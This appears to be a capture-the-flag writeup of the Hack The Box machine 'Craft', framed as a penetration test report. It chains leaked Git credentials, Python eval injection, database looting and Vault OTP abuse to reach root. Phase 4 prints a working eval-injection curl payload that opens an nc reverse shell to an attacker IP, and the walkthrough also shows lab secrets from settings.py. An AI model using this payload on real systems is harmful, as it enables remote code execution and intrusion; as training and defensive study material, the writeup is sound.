+++
title = "Craft-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "Craft is a medium-difficulty Linux machine featuring Gogs repository enumeration, credential discovery in commit history, Python eval injection for container access, database enumeration, and Vault OTP SSH authentication for root privilege escalation"
tags = ["CPTS", "HTB", "Craft", "CPTS Prep", "Linux", "Gogs", "Python Eval Injection", "Docker", "Vault", "OTP"]
+++

## Executive Summary

During December 2025, a simulated penetration test was conducted against the Linux host "Craft" (`10.129.18.139`). The objective was to evaluate the security posture of the target and identify potential escalation paths to root-level privileges.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to root compromise. The following key findings were identified:

- **Subdomain Discovery:** Virtual host enumeration revealed two subdomains: `api.craft.htb` and `gogs.craft.htb`, hosting a REST API and a Gogs Git service respectively.

- **Credential Leakage in Gogs:** Public repositories on the Gogs instance contained commit history with plaintext credentials for the user `dinesh`.

- **API Authentication:** The discovered credentials were used to authenticate to the Craft API, obtaining a JWT token for further requests.

- **Python Eval Injection:** The API's brew creation endpoint was vulnerable to Python eval injection, allowing execution of arbitrary commands. This was exploited to obtain a reverse shell on the underlying container.

- **Database Credential Discovery:** The container's application configuration contained database credentials, which were used to query the MySQL database and retrieve additional user credentials.

- **Password Reuse:** The credentials for user `gilfoyle` retrieved from the database were successfully used to authenticate via SSH to the host system.

- **Vault OTP SSH Access:** The user `gilfoyle` had access to HashiCorp Vault, configured with an SSH OTP (One-Time Password) role for root access. Using Vault, a one-time password was generated and used to authenticate as root.

**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to escalate to root privileges by exploiting credential leakage, insecure Python code execution, password reuse, and Vault misconfiguration.

**Recommendations:**

- **Secure Git Repositories:** Remove sensitive data from Git history and implement secret scanning tools to prevent credential leakage.
- **Input Validation:** Avoid using `eval()` on user-supplied input. Implement proper input validation and safe parsing techniques.
- **Container Security:** Containers should not store production database credentials in plaintext configuration files.
- **Password Reuse Prevention:** Implement multi-factor authentication and educate users about the risks of password reuse.
- **Vault Access Control:** Restrict Vault access to only necessary users and roles. Monitor OTP generation for anomalous activity.

## About

Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.


```bash
# Nmap 7.94SVN scan initiated Tue Dec  2 11:04:21 2025 as: nmap -vv -oN initial_nmap.txt 10.129.18.139
Nmap scan report for 10.129.18.139
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2025-12-02 11:04:21 +07 for 4s
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
443/tcp open  https   syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Dec  2 11:04:26 2025 -- 1 IP address (1 host up) scanned in 4.73 seconds

```

**Findings:** The scan revealed only two open ports: SSH (22/tcp) and HTTPS (443/tcp). The limited port exposure suggested web-based attack vectors.

**2. Web Application Exploration**  
Accessing the HTTPS service revealed a landing page for "Craft" with links to API documentation and a Gogs instance.

**Findings:** The page contained references to two subdomains: `api.craft.htb` and `gogs.craft.htb`.

**3. Subdomain Enumeration**  
Both subdomains were added to the hosts file and accessed.

- `api.craft.htb`: Served Swagger API documentation for a brewing management system.
    
- `gogs.craft.htb`: Hosted a Gogs Git service with public repositories.
    

### Phase 2: Gogs Repository Enumeration

**4. Public Repository Discovery**  
The Gogs explore page revealed public repositories belonging to users `dinesh`, `ebachman`, and `gilfoyle`.

**5. Commit History Analysis**  
The repositories' commit history was examined for sensitive information.

**Findings:** An old commit in one of the repositories contained a plaintext password for the user `dinesh`: `<REDACTED>`.

### Phase 3: API Authentication

**6. API Login Request**  
The discovered credentials were used to authenticate to the Craft API and obtain a JWT token.

```bash 
 curl -X GET "https://dinesh:<REDACTED> @api.craft.htb/api/auth/login" -H  "accept: application/json" -k
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NjUwNzg0fQ.mN4MxWirzk1VlXYfsDoE6qfbjmR5gIZ84-ydbUD4xxE"}

```
**Findings:** The API returned a JWT token for session authentication.

### Phase 4: Python Eval Injection

**7. Vulnerability Research**  
The API documentation revealed an endpoint for creating new brews (`/api/brew/`). Based on information from Gogs issues about a "broken feature" using `eval`, this endpoint was suspected to be vulnerable.

**8. Reverse Shell Payload**  
A Python eval injection payload was crafted to execute a reverse shell command.

```
TOKEN=$(curl -s -k -X GET "https://dinesh:<REDACTED>@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); \
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"0xdf\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.12 443 >/tmp/f')\"}" -k -H "X-CRAFT-API-TOKEN: $TOKEN"
```

### Phase 5: Container Access

**9. Reverse Shell Connection**  
A netcat listener received the connection, providing a shell on the container.


```bash 
❯ rlwrap -cAr nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.129.18.139 39157
/bin/sh: can't access tty; job control turned off
/opt/app # hostname
5a3d243127f5
/opt/app # whoami
root
/opt/app # ls
app.py
craft_api
dbtest.py
tests

```
**Findings:** The shell was running as root inside a Docker container with hostname `5a3d243127f5`.

**10. Container Exploration**  
The container's filesystem was examined for configuration files.

```bash 
/opt/app # cd craft_api
/opt/app/craft_api # ls -la
total 24
drwxr-xr-x    5 root     root          4096 Feb  7  2019 .
drwxr-xr-x    5 root     root          4096 Feb 10  2019 ..
-rw-r--r--    1 root     root             0 Feb  7  2019 __init__.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 __pycache__
drwxr-xr-x    5 root     root          4096 Feb  7  2019 api
drwxr-xr-x    3 root     root          4096 Feb  7  2019 database
-rw-r--r--    1 root     root           484 Feb  7  2019 settings.py
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
/opt/app/craft_api #

```

**Findings:** The configuration contained database credentials:

- Database user: `craft`
    
- Database password: `<REDACTED>`
    
- Database host: `db`
    

**12. Database Enumeration**  
A database test script was used to query the user table.

```bash 
/opt/app # python .dbtest.py  "SELECT * from user"
[{'id': 1, 'username': 'dinesh', 'password': '<REDACTED>'}, {'id': 4, 'username': 'ebachman', 'password': '<REDACTED>'}, {'id': 5, 'username': 'gilfoyle', 'password': '<REDACTED>'}]
/opt/app # python dbtest.py  "SELECT * from user"
[{'id': 1, 'username': 'dinesh', 'password': '<REDACTED>'}, {'id': 4, 'username': 'ebachman', 'password': '<REDACTED>'}, {'id': 5, 'username': 'gilfoyle', 'password': '<REDACTED>'}]
/opt/app #

```
**Findings:** The database contained credentials for three users:

- `dinesh`: `<REDACTED>` (already known)
    
- `ebachman`: `<REDACTED>`
    
- `gilfoyle`: `<REDACTED>`
    

### Phase 7: Host System Access

**13. Password Reuse Attempt**  
The credentials for `gilfoyle` were tested for SSH access to the host system.


```bash 
Enter passphrase for key 'gilfoyle_id_rsa':
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ cat user.txt
<REDACTED>
gilfoyle@craft:~$

```

**Findings:** Password reuse was successful, granting access to the host system as user `gilfoyle`.
The user flag was retrieved from `gilfoyle`'s home directory.

### Phase 8: Vault OTP SSH Access

**14. Vault Discovery**  
The user `gilfoyle` had HashiCorp Vault installed and configured for SSH OTP authentication.

**15. Vault Role Enumeration**  
The available SSH roles in Vault were examined.
```bash 

gilfoyle@craft:~$ vault read ssh/roles/root_otp
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22

```
**Findings:** A role named `root_otp` was configured to allow OTP-based SSH access as root.


**17. OTP Generation**  
Vault was used to generate a one-time password for root SSH access. 
The OTP was used to authenticate as root via SSH.
With root access achieved, the root flag was retrieved.
```bash
gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 9aad7e6b-9873-158b-80ce-df5d45ee0e1d


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password:
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~# ls
root.txt
root@craft:~# cat root.txt
<REDACTED> 
root@craft:~#

```

## Key Takeaways

- **Git History Leakage:** Commit histories can contain sensitive information like passwords. Always use tools like `git filter-branch` or `BFG Repo-Cleaner` to remove secrets from history.
    
- **Python Eval Injection:** The `eval()` function should never be used on user-supplied input, as it allows arbitrary code execution.
    
- **Container Security:** Containers should follow the principle of least privilege and avoid storing sensitive credentials in plaintext configuration files.
    
- **Password Reuse:** Users often reuse passwords across services, making credential stuffing attacks effective.
    
- **Vault OTP Security:** While Vault OTP provides secure one-time passwords, access to Vault itself must be properly restricted.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
